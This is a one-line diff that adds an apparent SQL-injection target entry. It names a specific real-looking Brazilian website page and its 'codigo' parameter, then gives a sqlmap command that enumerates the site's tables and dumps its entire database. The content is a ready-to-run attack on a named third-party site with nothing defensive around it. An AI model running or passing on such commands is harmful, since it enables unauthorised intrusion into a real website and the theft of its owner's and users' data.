@@ -1,0 +1,1 @@
+http://www.areassp.com.br/pagina.php?codigo=2 (GET)  # sqlmap.py -u http://www.areassp.com.br/pagina.php?codigo=2 -D areassp --tables --dump-all --threads 5 -v3
